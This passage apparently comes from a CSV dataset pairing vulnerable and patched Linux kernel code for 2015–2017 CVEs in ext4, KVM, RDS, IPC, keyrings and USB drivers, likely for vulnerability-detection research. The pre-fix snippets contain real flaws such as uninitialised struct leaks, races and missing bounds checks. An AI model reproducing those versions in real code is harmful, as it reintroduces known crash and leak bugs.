 return btrfs_truncate_page(inode, offset, page_end - offset, 0);
	}

 btrfs_set_file_extent_ram_bytes(leaf, fi, size);
	size = btrfs_file_extent_calc_inline_size(size);
 btrfs_truncate_item(root, path, size, 1);

 if (test_bit(BTRFS_ROOT_REF_COWS, &root->state))
 inode_sub_bytes(inode, item_end + 1 - new_size);

 return 0;
}

/*
 * this can truncate away extent items, csum items and directory items.
 * It starts at a high offset and removes keys until it can't find
			 * special encodings
 */
 if (!del_item &&

 btrfs_file_extent_encryption(leaf, fi) == 0 &&
 btrfs_file_extent_other_encoding(leaf, fi) == 0) {






 /*
				 * Need to release path in order to truncate a
				 * compressed extent. So delete any accumulated
				 * extent items so far.
 */
 if (btrfs_file_extent_compression(leaf, fi) !=
				    BTRFS_COMPRESS_NONE && pending_del_nr) {
					err = btrfs_del_items(trans, root, path,
							      pending_del_slot,
							      pending_del_nr);
 if (err) {
 btrfs_abort_transaction(trans,
									root,
									err);
 goto error;
					}
					pending_del_nr = 0;
				}

				err = truncate_inline_extent(inode, path,
							     &found_key,
							     item_end,
							     new_size);
 if (err) {
 btrfs_abort_transaction(trans,
								root, err);
 goto error;
				}
			} else if (test_bit(BTRFS_ROOT_REF_COWS,
					    &root->state)) {
 inode_sub_bytes(inode, item_end + 1 - new_size);

			}
		}
delete:
"
2016,DoS ,CVE-2015-8324," struct list_head	list;		/* per-file finished AIO list */
 struct inode		*inode;		/* file being written to */
 unsigned int		flag;		/* unwritten or not */
 int			error;		/* I/O error code */
 loff_t			offset;		/* offset in the file */
 ssize_t			size;		/* size of the extent */
 struct work_struct	work;		/* data work queue */
					 EXT4_GET_BLOCKS_CREATE_UNINIT_EXT)
 /* Convert extent to initialized after IO complete */
#define EXT4_GET_BLOCKS_IO_CONVERT_EXT		(EXT4_GET_BLOCKS_CONVERT|\
 EXT4_GET_BLOCKS_IO_CREATE_EXT)

/*
 * Flags used by ext4_free_blocks

 /* completed IOs that might need unwritten extents handling */
 struct list_head i_completed_io_list;

 /* current io_end structure for async DIO write*/
 ext4_io_end_t *cur_aio_dio;

#define EXT4_MOUNT_QUOTA 0x80000 /* Some quota option set */
#define EXT4_MOUNT_USRQUOTA 0x100000 /* ""old"" user quota */
#define EXT4_MOUNT_GRPQUOTA 0x200000 /* ""old"" group quota */

#define EXT4_MOUNT_JOURNAL_CHECKSUM 0x800000 /* Journal checksums */
#define EXT4_MOUNT_JOURNAL_ASYNC_COMMIT 0x1000000 /* Journal Async Commit */
#define EXT4_MOUNT_I_VERSION 0x2000000 /* i_version support */
			     __u64 len, __u64 *moved_len);











/*
 * Add new method to test wether block and inode bitmaps are properly
 * initialized. With uninit_bg reading the block from disk is not enough
 return 0;
}

























#endif /* _EXT4_JBD2_H */
 BUG_ON(path[depth].p_hdr == NULL);

 /* try to insert block into found extent and return */
 if (ex && (flag != EXT4_GET_BLOCKS_PRE_IO)
		&& ext4_can_extents_be_merged(inode, ex, newext)) {
 ext_debug(""append [%d]%d block to %d:[%d]%d (from %llu)\n"",
 ext4_ext_is_uninitialized(newext),

merge:
 /* try to merge extents to the right */
 if (flag != EXT4_GET_BLOCKS_PRE_IO)
 ext4_ext_try_to_merge(inode, path, nearex);

 /* try to merge extents to the left */
 ext4_ext_show_leaf(inode, path);

 /* get_block() before submit the IO, split the extent */
 if (flags == EXT4_GET_BLOCKS_PRE_IO) {
		ret = ext4_split_unwritten_extents(handle,
						inode, path, iblock,
						max_blocks, flags);
			io->flag = EXT4_IO_UNWRITTEN;
 else
 ext4_set_inode_state(inode, EXT4_STATE_DIO_UNWRITTEN);


 goto out;
	}
 /* IO end_io complete, convert the filled extent to written */
 if (flags == EXT4_GET_BLOCKS_CONVERT) {
		ret = ext4_convert_unwritten_extents_endio(handle, inode,
							path);
 if (ret >= 0)
 if (flags & EXT4_GET_BLOCKS_UNINIT_EXT){
 ext4_ext_mark_uninitialized(&newex);
 /*
		 * io_end structure was created for every async
		 * direct IO write to the middle of the file.
		 * To avoid unecessary convertion for every aio dio rewrite
		 * to the mid of file, here we flag the IO that is really
		 * need the convertion.
		 * For non asycn direct IO case, flag the inode state
		 * that we need to perform convertion when IO is done.
 */
 if (flags == EXT4_GET_BLOCKS_PRE_IO) {
 if (io)
				io->flag = EXT4_IO_UNWRITTEN;
 else
 ext4_set_inode_state(inode,
						     EXT4_STATE_DIO_UNWRITTEN);
		}


	}

 if (unlikely(EXT4_I(inode)->i_flags & EXT4_EOFBLOCKS_FL)) {
"," struct list_head	list;		/* per-file finished AIO list */
 struct inode		*inode;		/* file being written to */
 unsigned int		flag;		/* unwritten or not */
 struct page		*page;		/* page struct for buffer write */
 loff_t			offset;		/* offset in the file */
 ssize_t			size;		/* size of the extent */
 struct work_struct	work;		/* data work queue */
					 EXT4_GET_BLOCKS_CREATE_UNINIT_EXT)
 /* Convert extent to initialized after IO complete */
#define EXT4_GET_BLOCKS_IO_CONVERT_EXT		(EXT4_GET_BLOCKS_CONVERT|\
 EXT4_GET_BLOCKS_CREATE_UNINIT_EXT)

/*
 * Flags used by ext4_free_blocks

 /* completed IOs that might need unwritten extents handling */
 struct list_head i_completed_io_list;
 spinlock_t i_completed_io_lock;
 /* current io_end structure for async DIO write*/
 ext4_io_end_t *cur_aio_dio;

#define EXT4_MOUNT_QUOTA 0x80000 /* Some quota option set */
#define EXT4_MOUNT_USRQUOTA 0x100000 /* ""old"" user quota */
#define EXT4_MOUNT_GRPQUOTA 0x200000 /* ""old"" group quota */
#define EXT4_MOUNT_DIOREAD_NOLOCK 0x400000 /* Enable support for dio read nolocking */
#define EXT4_MOUNT_JOURNAL_CHECKSUM 0x800000 /* Journal checksums */
#define EXT4_MOUNT_JOURNAL_ASYNC_COMMIT 0x1000000 /* Journal Async Commit */
#define EXT4_MOUNT_I_VERSION 0x2000000 /* i_version support */
			     __u64 len, __u64 *moved_len);


/* BH_Uninit flag: blocks are allocated but uninitialized on disk */
enum ext4_state_bits {
	BH_Uninit	/* blocks are allocated but uninitialized on disk */
	  = BH_JBDPrivateStart,
};

BUFFER_FNS(Uninit, uninit)
TAS_BUFFER_FNS(Uninit, uninit)

/*
 * Add new method to test wether block and inode bitmaps are properly
 * initialized. With uninit_bg reading the block from disk is not enough
 return 0;
}

/*
 * This function controls whether or not we should try to go down the
 * dioread_nolock code paths, which makes it safe to avoid taking
 * i_mutex for direct I/O reads.  This only works for extent-based
 * files, and it doesn't work for nobh or if data journaling is
 * enabled, since the dioread_nolock code uses b_private to pass
 * information back to the I/O completion handler, and this conflicts
 * with the jbd's use of b_private.
 */
static inline int ext4_should_dioread_nolock(struct inode *inode)
{
 if (!test_opt(inode->i_sb, DIOREAD_NOLOCK))
 return 0;
 if (test_opt(inode->i_sb, NOBH))
 return 0;
 if (!S_ISREG(inode->i_mode))
 return 0;
 if (!(EXT4_I(inode)->i_flags & EXT4_EXTENTS_FL))
 return 0;
 if (ext4_should_journal_data(inode))
 return 0;
 return 1;
}

#endif /* _EXT4_JBD2_H */
 BUG_ON(path[depth].p_hdr == NULL);

 /* try to insert block into found extent and return */
 if (ex && !(flag & EXT4_GET_BLOCKS_PRE_IO)
		&& ext4_can_extents_be_merged(inode, ex, newext)) {
 ext_debug(""append [%d]%d block to %d:[%d]%d (from %llu)\n"",
 ext4_ext_is_uninitialized(newext),

merge:
 /* try to merge extents to the right */
 if (!(flag & EXT4_GET_BLOCKS_PRE_IO))
 ext4_ext_try_to_merge(inode, path, nearex);

 /* try to merge extents to the left */
 ext4_ext_show_leaf(inode, path);

 /* get_block() before submit the IO, split the extent */
 if ((flags & EXT4_GET_BLOCKS_PRE_IO)) {
		ret = ext4_split_unwritten_extents(handle,
						inode, path, iblock,
						max_blocks, flags);
			io->flag = EXT4_IO_UNWRITTEN;
 else
 ext4_set_inode_state(inode, EXT4_STATE_DIO_UNWRITTEN);
 if (ext4_should_dioread_nolock(inode))
 set_buffer_uninit(bh_result);
 goto out;
	}
 /* IO end_io complete, convert the filled extent to written */
 if ((flags & EXT4_GET_BLOCKS_CONVERT)) {
		ret = ext4_convert_unwritten_extents_endio(handle, inode,
							path);
 if (ret >= 0)
 if (flags & EXT4_GET_BLOCKS_UNINIT_EXT){
 ext4_ext_mark_uninitialized(&newex);
 /*
		 * io_end structure was created for every IO write to an
		 * uninitialized extent. To avoid unecessary conversion,
		 * here we flag the IO that really needs the conversion.


		 * For non asycn direct IO case, flag the inode state
		 * that we need to perform convertion when IO is done.
 */
 if ((flags & EXT4_GET_BLOCKS_PRE_IO)) {
 if (io)
				io->flag = EXT4_IO_UNWRITTEN;
 else
 ext4_set_inode_state(inode,
						     EXT4_STATE_DIO_UNWRITTEN);
		}
 if (ext4_should_dioread_nolock(inode))
 set_buffer_uninit(bh_result);
	}

 if (unlikely(EXT4_I(inode)->i_flags & EXT4_EOFBLOCKS_FL)) {
"
2015,DoS ,CVE-2015-8215," return ret;
}
















static void dev_disable_change(struct inet6_dev *idev)
{
 struct netdev_notifier_info info;
			.data		= &ipv6_devconf.mtu6,
			.maxlen		= sizeof(int),
			.mode		= 0644,
			.proc_handler	= proc_dointvec,
		},
		{
			.procname	= ""accept_ra"",
"," return ret;
}

static
int addrconf_sysctl_mtu(struct ctl_table *ctl, int write,
 void __user *buffer, size_t *lenp, loff_t *ppos)
{
 struct inet6_dev *idev = ctl->extra1;
 int min_mtu = IPV6_MIN_MTU;
 struct ctl_table lctl;

	lctl = *ctl;
	lctl.extra1 = &min_mtu;
	lctl.extra2 = idev ? &idev->dev->mtu : NULL;

 return proc_dointvec_minmax(&lctl, write, buffer, lenp, ppos);
}

static void dev_disable_change(struct inet6_dev *idev)
{
 struct netdev_notifier_info info;
			.data		= &ipv6_devconf.mtu6,
			.maxlen		= sizeof(int),
			.mode		= 0644,
			.proc_handler	= addrconf_sysctl_mtu,
		},
		{
			.procname	= ""accept_ra"",
"
2015,DoS ,CVE-2015-8104," set_exception_intercept(svm, UD_VECTOR);
 set_exception_intercept(svm, MC_VECTOR);
 set_exception_intercept(svm, AC_VECTOR);


 set_intercept(svm, INTERCEPT_INTR);
 set_intercept(svm, INTERCEPT_NMI);
 mark_dirty(svm->vmcb, VMCB_SEG);
}

static void update_db_bp_intercept(struct kvm_vcpu *vcpu)
{
 struct vcpu_svm *svm = to_svm(vcpu);

 clr_exception_intercept(svm, DB_VECTOR);
 clr_exception_intercept(svm, BP_VECTOR);

 if (svm->nmi_singlestep)
 set_exception_intercept(svm, DB_VECTOR);

 if (vcpu->guest_debug & KVM_GUESTDBG_ENABLE) {
 if (vcpu->guest_debug &
		    (KVM_GUESTDBG_SINGLESTEP | KVM_GUESTDBG_USE_HW_BP))
 set_exception_intercept(svm, DB_VECTOR);
 if (vcpu->guest_debug & KVM_GUESTDBG_USE_SW_BP)
 set_exception_intercept(svm, BP_VECTOR);
	} else
 if (!(svm->vcpu.guest_debug & KVM_GUESTDBG_SINGLESTEP))
			svm->vmcb->save.rflags &=
				~(X86_EFLAGS_TF | X86_EFLAGS_RF);
 update_db_bp_intercept(&svm->vcpu);
	}

 if (svm->vcpu.guest_debug &
 */
	svm->nmi_singlestep = true;
	svm->vmcb->save.rflags |= (X86_EFLAGS_TF | X86_EFLAGS_RF);
 update_db_bp_intercept(vcpu);
}

static int svm_set_tss_addr(struct kvm *kvm, unsigned int addr)
	.vcpu_load = svm_vcpu_load,
	.vcpu_put = svm_vcpu_put,

	.update_db_bp_intercept = update_db_bp_intercept,
	.get_msr = svm_get_msr,
	.set_msr = svm_set_msr,
	.get_segment_base = svm_get_segment_base,
"," set_exception_intercept(svm, UD_VECTOR);
 set_exception_intercept(svm, MC_VECTOR);
 set_exception_intercept(svm, AC_VECTOR);
 set_exception_intercept(svm, DB_VECTOR);

 set_intercept(svm, INTERCEPT_INTR);
 set_intercept(svm, INTERCEPT_NMI);
 mark_dirty(svm->vmcb, VMCB_SEG);
}

static void update_bp_intercept(struct kvm_vcpu *vcpu)
{
 struct vcpu_svm *svm = to_svm(vcpu);


 clr_exception_intercept(svm, BP_VECTOR);




 if (vcpu->guest_debug & KVM_GUESTDBG_ENABLE) {



 if (vcpu->guest_debug & KVM_GUESTDBG_USE_SW_BP)
 set_exception_intercept(svm, BP_VECTOR);
	} else
 if (!(svm->vcpu.guest_debug & KVM_GUESTDBG_SINGLESTEP))
			svm->vmcb->save.rflags &=
				~(X86_EFLAGS_TF | X86_EFLAGS_RF);

	}

 if (svm->vcpu.guest_debug &
 */
	svm->nmi_singlestep = true;
	svm->vmcb->save.rflags |= (X86_EFLAGS_TF | X86_EFLAGS_RF);

}

static int svm_set_tss_addr(struct kvm *kvm, unsigned int addr)
	.vcpu_load = svm_vcpu_load,
	.vcpu_put = svm_vcpu_put,

	.update_db_bp_intercept = update_bp_intercept,
	.get_msr = svm_get_msr,
	.set_msr = svm_set_msr,
	.get_segment_base = svm_get_segment_base,
"
2016,DoS Mem. Corr. ,CVE-2015-8019,,
2015,DoS ,CVE-2015-7990,"		}
	}

 if (trans == NULL) {
 kmem_cache_free(rds_conn_slab, conn);
		conn = ERR_PTR(-ENODEV);
 goto out;
	}

	conn->c_trans = trans;

	ret = trans->conn_alloc(conn, gfp);
 release_sock(sk);
	}

 /* racing with another thread binding seems ok here */
 if (daddr == 0 || rs->rs_bound_addr == 0) {

		ret = -ENOTCONN; /* XXX not a great errno */
 goto out;
	}


 if (payload_len > rds_sk_sndbuf(rs)) {
		ret = -EMSGSIZE;
","		}
	}







	conn->c_trans = trans;

	ret = trans->conn_alloc(conn, gfp);
 release_sock(sk);
	}

 lock_sock(sk);
 if (daddr == 0 || rs->rs_bound_addr == 0) {
 release_sock(sk);
		ret = -ENOTCONN; /* XXX not a great errno */
 goto out;
	}
 release_sock(sk);

 if (payload_len > rds_sk_sndbuf(rs)) {
		ret = -EMSGSIZE;
"
2015,#NAME?,CVE-2015-7885,"
 spin_lock_irqsave(&dgnc_global_lock, flags);


		ddi.dinfo_nboards = dgnc_NumBoards;
 sprintf(ddi.dinfo_version, ""%s"", DG_PART);

","
 spin_lock_irqsave(&dgnc_global_lock, flags);

 memset(&ddi, 0, sizeof(ddi));
		ddi.dinfo_nboards = dgnc_NumBoards;
 sprintf(ddi.dinfo_version, ""%s"", DG_PART);

"
2015,#NAME?,CVE-2015-7884," case FBIOGET_VBLANK: {
 struct fb_vblank vblank;


		vblank.flags = FB_VBLANK_HAVE_COUNT | FB_VBLANK_HAVE_VCOUNT |
			FB_VBLANK_HAVE_VSYNC;
		vblank.count = 0;
"," case FBIOGET_VBLANK: {
 struct fb_vblank vblank;

 memset(&vblank, 0, sizeof(vblank));
		vblank.flags = FB_VBLANK_HAVE_COUNT | FB_VBLANK_HAVE_VCOUNT |
			FB_VBLANK_HAVE_VSYNC;
		vblank.count = 0;
"
2015,DoS ,CVE-2015-7872," kdebug(""- %u"", key->serial);
 key_check(key);

 /* Throw away the key data */
 if (key->type->destroy)


			key->type->destroy(key);

 security_key_free(key);

 kenter("""");




	user = key_user_lookup(current_fsuid());
 if (!user)
 return ERR_PTR(-ENOMEM);
"," kdebug(""- %u"", key->serial);
 key_check(key);

 /* Throw away the key data if the key is instantiated */
 if (test_bit(KEY_FLAG_INSTANTIATED, &key->flags) &&
		    !test_bit(KEY_FLAG_NEGATIVE, &key->flags) &&
		    key->type->destroy)
			key->type->destroy(key);

 security_key_free(key);

 kenter("""");

 if (ctx->index_key.type == &key_type_keyring)
 return ERR_PTR(-EPERM);

	user = key_user_lookup(current_fsuid());
 if (!user)
 return ERR_PTR(-ENOMEM);
"
2015,DoS ,CVE-2015-7799,,
2015,#NAME?,CVE-2015-7613," return retval;
	}

 /* ipc_addid() locks msq upon success. */
	id = ipc_addid(&msg_ids(ns), &msq->q_perm, ns->msg_ctlmni);
 if (id < 0) {
 ipc_rcu_putref(msq, msg_rcu_free);
 return id;
	}

	msq->q_stime = msq->q_rtime = 0;
	msq->q_ctime = get_seconds();
	msq->q_cbytes = msq->q_qnum = 0;
 INIT_LIST_HEAD(&msq->q_receivers);
 INIT_LIST_HEAD(&msq->q_senders);








 ipc_unlock_object(&msq->q_perm);
 rcu_read_unlock();

 if (IS_ERR(file))
 goto no_file;

	id = ipc_addid(&shm_ids(ns), &shp->shm_perm, ns->shm_ctlmni);
 if (id < 0) {
		error = id;
 goto no_id;
	}

	shp->shm_cprid = task_tgid_vnr(current);
	shp->shm_lprid = 0;
	shp->shm_atim = shp->shm_dtim = 0;
	shp->shm_nattch = 0;
	shp->shm_file = file;
	shp->shm_creator = current;







 list_add(&shp->shm_clist, &current->sysvshm.shm_clist);

 /*
 rcu_read_lock();
 spin_lock(&new->lock);





	id = idr_alloc(&ids->ipcs_idr, new,
		       (next_id < 0) ? 0 : ipcid_to_idx(next_id), 0,
		       GFP_NOWAIT);

	ids->in_use++;

 current_euid_egid(&euid, &egid);
	new->cuid = new->uid = euid;
	new->gid = new->cgid = egid;

 if (next_id < 0) {
		new->seq = ids->seq++;
 if (ids->seq > IPCID_SEQ_MAX)
"," return retval;
	}








	msq->q_stime = msq->q_rtime = 0;
	msq->q_ctime = get_seconds();
	msq->q_cbytes = msq->q_qnum = 0;
 INIT_LIST_HEAD(&msq->q_receivers);
 INIT_LIST_HEAD(&msq->q_senders);

 /* ipc_addid() locks msq upon success. */
	id = ipc_addid(&msg_ids(ns), &msq->q_perm, ns->msg_ctlmni);
 if (id < 0) {
 ipc_rcu_putref(msq, msg_rcu_free);
 return id;
	}

 ipc_unlock_object(&msq->q_perm);
 rcu_read_unlock();

 if (IS_ERR(file))
 goto no_file;







	shp->shm_cprid = task_tgid_vnr(current);
	shp->shm_lprid = 0;
	shp->shm_atim = shp->shm_dtim = 0;
	shp->shm_nattch = 0;
	shp->shm_file = file;
	shp->shm_creator = current;

	id = ipc_addid(&shm_ids(ns), &shp->shm_perm, ns->shm_ctlmni);
 if (id < 0) {
		error = id;
 goto no_id;
	}

 list_add(&shp->shm_clist, &current->sysvshm.shm_clist);

 /*
 rcu_read_lock();
 spin_lock(&new->lock);

 current_euid_egid(&euid, &egid);
	new->cuid = new->uid = euid;
	new->gid = new->cgid = egid;

	id = idr_alloc(&ids->ipcs_idr, new,
		       (next_id < 0) ? 0 : ipcid_to_idx(next_id), 0,
		       GFP_NOWAIT);

	ids->in_use++;





 if (next_id < 0) {
		new->seq = ids->seq++;
 if (ids->seq > IPCID_SEQ_MAX)
"
2016,DoS ,CVE-2015-7566," */

 /* some sanity check */
 if (serial->num_ports < 2)
 return -1;



 /* port 0 now uses the modified endpoint Address */
	port = serial->port[0];
"," */

 /* some sanity check */
 if (serial->num_bulk_out < 2) {
 dev_err(&serial->interface->dev, ""missing bulk out endpoints\n"");
 return -ENODEV;
	}

 /* port 0 now uses the modified endpoint Address */
	port = serial->port[0];
"
2016,DoS ,CVE-2015-7550,"
 /* the key is probably readable - now try to read it */
can_read_key:
	ret = key_validate(key);
 if (ret == 0) {
		ret = -EOPNOTSUPP;
 if (key->type->read) {
 /* read the data with the semaphore held (since we
			 * might sleep) */
 down_read(&key->sem);

			ret = key->type->read(key, buffer, buflen);
 up_read(&key->sem);
		}
	}

error2:
","
 /* the key is probably readable - now try to read it */
can_read_key:
	ret = -EOPNOTSUPP;
 if (key->type->read) {
 /* Read the data with the semaphore held (since we might sleep)
		 * to protect against the key being updated or revoked.
 */
 down_read(&key->sem);
		ret = key_validate(key);
 if (ret == 0)
			ret = key->type->read(key, buffer, buflen);
 up_read(&key->sem);

	}

error2:
"
2016,DoS ,CVE-2015-7515," input_set_abs_params(inputdev, ABS_TILT_Y, AIPTEK_TILT_MIN, AIPTEK_TILT_MAX, 0, 0);
 input_set_abs_params(inputdev, ABS_WHEEL, AIPTEK_WHEEL_MIN, AIPTEK_WHEEL_MAX - 1, 0, 0);









	endpoint = &intf->altsetting[0].endpoint[0].desc;

 /* Go set up our URB, which is called when the tablet receives
 if (i == ARRAY_SIZE(speeds)) {
 dev_info(&intf->dev,
 ""Aiptek tried all speeds, no sane response\n"");

 goto fail3;
	}

"," input_set_abs_params(inputdev, ABS_TILT_Y, AIPTEK_TILT_MIN, AIPTEK_TILT_MAX, 0, 0);
 input_set_abs_params(inputdev, ABS_WHEEL, AIPTEK_WHEEL_MIN, AIPTEK_WHEEL_MAX - 1, 0, 0);

 /* Verify that a device really has an endpoint */
 if (intf->altsetting[0].desc.bNumEndpoints < 1) {
 dev_err(&intf->dev,
 ""interface has %d endpoints, but must have minimum 1\n"",
			intf->altsetting[0].desc.bNumEndpoints);
		err = -EINVAL;
 goto fail3;
	}
	endpoint = &intf->altsetting[0].endpoint[0].desc;

 /* Go set up our URB, which is called when the tablet receives
 if (i == ARRAY_SIZE(speeds)) {
 dev_info(&intf->dev,
 ""Aiptek tried all speeds, no sane response\n"");
		err = -EINVAL;
 goto fail3;
	}

"
2016,DoS ,CVE-2015-7513,"
static int kvm_vm_ioctl_set_pit(struct kvm *kvm, struct kvm_pit_state *ps)
{

 mutex_lock(&kvm->arch.vpit->pit_state.lock);
 memcpy(&kvm->arch.vpit->pit_state, ps, sizeof(struct kvm_pit_state));
 kvm_pit_load_count(kvm, 0, ps->channels[0].count, 0);

 mutex_unlock(&kvm->arch.vpit->pit_state.lock);
 return 0;
}
static int kvm_vm_ioctl_set_pit2(struct kvm *kvm, struct kvm_pit_state2 *ps)
{
 int start = 0;

	u32 prev_legacy, cur_legacy;
 mutex_lock(&kvm->arch.vpit->pit_state.lock);
	prev_legacy = kvm->arch.vpit->pit_state.flags & KVM_PIT_FLAGS_HPET_LEGACY;
 memcpy(&kvm->arch.vpit->pit_state.channels, &ps->channels,
 sizeof(kvm->arch.vpit->pit_state.channels));
	kvm->arch.vpit->pit_state.flags = ps->flags;
 kvm_pit_load_count(kvm, 0, kvm->arch.vpit->pit_state.channels[0].count, start);

 mutex_unlock(&kvm->arch.vpit->pit_state.lock);
 return 0;
}
","
static int kvm_vm_ioctl_set_pit(struct kvm *kvm, struct kvm_pit_state *ps)
{
 int i;
 mutex_lock(&kvm->arch.vpit->pit_state.lock);
 memcpy(&kvm->arch.vpit->pit_state, ps, sizeof(struct kvm_pit_state));
 for (i = 0; i < 3; i++)
 kvm_pit_load_count(kvm, i, ps->channels[i].count, 0);
 mutex_unlock(&kvm->arch.vpit->pit_state.lock);
 return 0;
}
static int kvm_vm_ioctl_set_pit2(struct kvm *kvm, struct kvm_pit_state2 *ps)
{
 int start = 0;
 int i;
	u32 prev_legacy, cur_legacy;
 mutex_lock(&kvm->arch.vpit->pit_state.lock);
	prev_legacy = kvm->arch.vpit->pit_state.flags & KVM_PIT_FLAGS_HPET_LEGACY;
 memcpy(&kvm->arch.vpit->pit_state.channels, &ps->channels,
 sizeof(kvm->arch.vpit->pit_state.channels));
	kvm->arch.vpit->pit_state.flags = ps->flags;
 for (i = 0; i < 3; i++)
 kvm_pit_load_count(kvm, i, kvm->arch.vpit->pit_state.channels[i].count, start);
 mutex_unlock(&kvm->arch.vpit->pit_state.lock);
 return 0;
}
"
2015,DoS ,CVE-2015-7509," struct ext4_iloc iloc;
 int err = 0, rc;

 if (!ext4_handle_valid(handle))
 return 0;

 mutex_lock(&EXT4_SB(sb)->s_orphan_lock);
 struct ext4_iloc iloc;
 int err = 0;

 /* ext4_handle_valid() assumes a valid handle_t pointer */
 if (handle && !ext4_handle_valid(handle))
 return 0;

 mutex_lock(&EXT4_SB(inode->i_sb)->s_orphan_lock);
	 * transaction handle with which to update the orphan list on
	 * disk, but we still need to remove the inode from the linked
	 * list in memory. */
 if (sbi->s_journal && !handle)
 goto out;

	err = ext4_reserve_inode_write(handle, inode, &iloc);
"," struct ext4_iloc iloc;
 int err = 0, rc;

 if (!EXT4_SB(sb)->s_journal)
 return 0;

 mutex_lock(&EXT4_SB(sb)->s_orphan_lock);
 struct ext4_iloc iloc;
 int err = 0;

 if (!EXT4_SB(inode->i_sb)->s_journal)

 return 0;

 mutex_lock(&EXT4_SB(inode->i_sb)->s_orphan_lock);
	 * transaction handle with which to update the orphan list on
	 * disk, but we still need to remove the inode from the linked
	 * list in memory. */
 if (!handle)
 goto out;

	err = ext4_reserve_inode_write(handle, inode, &iloc);
"
2015,DoS +Priv ,CVE-2015-7312,,
2015,DoS ,CVE-2015-6937,"		}
	}







	conn->c_trans = trans;

	ret = trans->conn_alloc(conn, gfp);
","		}
	}

 if (trans == NULL) {
 kmem_cache_free(rds_conn_slab, conn);
		conn = ERR_PTR(-ENODEV);
 goto out;
	}

	conn->c_trans = trans;

	ret = trans->conn_alloc(conn, gfp);
"
2015,DoS ,CVE-2015-6526,"	sp = regs->gpr[1];
 perf_callchain_store(entry, next_ip);

 for (;;) {
		fp = (unsigned long __user *) sp;
 if (!valid_user_sp(sp, 1) || read_user_stack_64(fp, &next_sp))
 return;
","	sp = regs->gpr[1];
 perf_callchain_store(entry, next_ip);

 while (entry->nr < PERF_MAX_STACK_DEPTH) {
		fp = (unsigned long __user *) sp;
 if (!valid_user_sp(sp, 1) || read_user_stack_64(fp, &next_sp))
 return;
"
2015,DoS ,CVE-2015-6252,"		}
 if (eventfp != d->log_file) {
			filep = d->log_file;

			ctx = d->log_ctx;
			d->log_ctx = eventfp ?
 eventfd_ctx_fileget(eventfp) : NULL;
","		}
 if (eventfp != d->log_file) {
			filep = d->log_file;
			d->log_file = eventfp;
			ctx = d->log_ctx;
			d->log_ctx = eventfp ?
 eventfd_ctx_fileget(eventfp) : NULL;
"
2015,DoS Overflow ,CVE-2015-5707,"			md->from_user = 0;
	}




 if (iov_count) {
 int size = sizeof(struct iovec) * iov_count;
 struct iovec *iov;
","			md->from_user = 0;
	}

 if (unlikely(iov_count > MAX_UIOVEC))
 return -EINVAL;

 if (iov_count) {
 int size = sizeof(struct iovec) * iov_count;
 struct iovec *iov;
"
2015,DoS ,CVE-2015-5706,"
 if (unlikely(file->f_flags & __O_TMPFILE)) {
		error = do_tmpfile(dfd, pathname, nd, flags, op, file, &opened);
 goto out;
	}

	error = path_init(dfd, pathname, flags, nd);
	}
out:
 path_cleanup(nd);

 if (!(opened & FILE_OPENED)) {
 BUG_ON(!error);
 put_filp(file);
","
 if (unlikely(file->f_flags & __O_TMPFILE)) {
		error = do_tmpfile(dfd, pathname, nd, flags, op, file, &opened);
 goto out2;
	}

	error = path_init(dfd, pathname, flags, nd);
	}
out:
 path_cleanup(nd);
out2:
 if (!(opened & FILE_OPENED)) {
 BUG_ON(!error);
 put_filp(file);
"
2015,#NAME?,CVE-2015-5697," char *ptr;
 int err;

	file = kmalloc(sizeof(*file), GFP_NOIO);
 if (!file)
 return -ENOMEM;

"," char *ptr;
 int err;

	file = kzalloc(sizeof(*file), GFP_NOIO);
 if (!file)
 return -ENOMEM;

"
2015,DoS ,CVE-2015-5366,"	}
 unlock_sock_fast(sk, slow);

 if (noblock)
 return -EAGAIN;

 /* starting over for a new packet */
	msg->msg_flags &= ~MSG_TRUNC;
 goto try_again;
}
	}
 unlock_sock_fast(sk, slow);

 if (noblock)
 return -EAGAIN;

 /* starting over for a new packet */
	msg->msg_flags &= ~MSG_TRUNC;
 goto try_again;
}
","	}
 unlock_sock_fast(sk, slow);

 /* starting over for a new packet, but check if we need to yield */
 cond_resched();


	msg->msg_flags &= ~MSG_TRUNC;
 goto try_again;
}
	}
 unlock_sock_fast(sk, slow);

 /* starting over for a new packet, but check if we need to yield */
 cond_resched();


	msg->msg_flags &= ~MSG_TRUNC;
 goto try_again;
}
"
2015,DoS ,CVE-2015-5364,"	}
 unlock_sock_fast(sk, slow);

 if (noblock)
 return -EAGAIN;

 /* starting over for a new packet */
	msg->msg_flags &= ~MSG_TRUNC;
 goto try_again;
}
	}
 unlock_sock_fast(sk, slow);

 if (noblock)
 return -EAGAIN;

 /* starting over for a new packet */
	msg->msg_flags &= ~MSG_TRUNC;
 goto try_again;
}
","	}
 unlock_sock_fast(sk, slow);

 /* starting over for a new packet, but check if we need to yield */
 cond_resched();


	msg->msg_flags &= ~MSG_TRUNC;
 goto try_again;
}
	}
 unlock_sock_fast(sk, slow);

 /* starting over for a new packet, but check if we need to yield */
 cond_resched();


	msg->msg_flags &= ~MSG_TRUNC;
 goto try_again;
}
"
2017,,CVE-2015-5327,,
2015,DoS ,CVE-2015-5307,"	{ SVM_EXIT_EXCP_BASE + UD_VECTOR,       ""UD excp"" }, \
	{ SVM_EXIT_EXCP_BASE + PF_VECTOR,       ""PF excp"" }, \
	{ SVM_EXIT_EXCP_BASE + NM_VECTOR,       ""NM excp"" }, \

	{ SVM_EXIT_EXCP_BASE + MC_VECTOR,       ""MC excp"" }, \
	{ SVM_EXIT_INTR,        ""interrupt"" }, \
	{ SVM_EXIT_NMI,         ""nmi"" }, \
 set_exception_intercept(svm, PF_VECTOR);
 set_exception_intercept(svm, UD_VECTOR);
 set_exception_intercept(svm, MC_VECTOR);


 set_intercept(svm, INTERCEPT_INTR);
 set_intercept(svm, INTERCEPT_NMI);
 return 1;
}







static void svm_fpu_activate(struct kvm_vcpu *vcpu)
{
 struct vcpu_svm *svm = to_svm(vcpu);
	[SVM_EXIT_EXCP_BASE + PF_VECTOR]	= pf_interception,
	[SVM_EXIT_EXCP_BASE + NM_VECTOR]	= nm_interception,
	[SVM_EXIT_EXCP_BASE + MC_VECTOR]	= mc_interception,

	[SVM_EXIT_INTR]				= intr_interception,
	[SVM_EXIT_NMI]				= nmi_interception,
	[SVM_EXIT_SMI]				= nop_on_interception,
	u32 eb;

	eb = (1u << PF_VECTOR) | (1u << UD_VECTOR) | (1u << MC_VECTOR) |
	     (1u << NM_VECTOR) | (1u << DB_VECTOR);
 if ((vcpu->guest_debug &
	     (KVM_GUESTDBG_ENABLE | KVM_GUESTDBG_USE_SW_BP)) ==
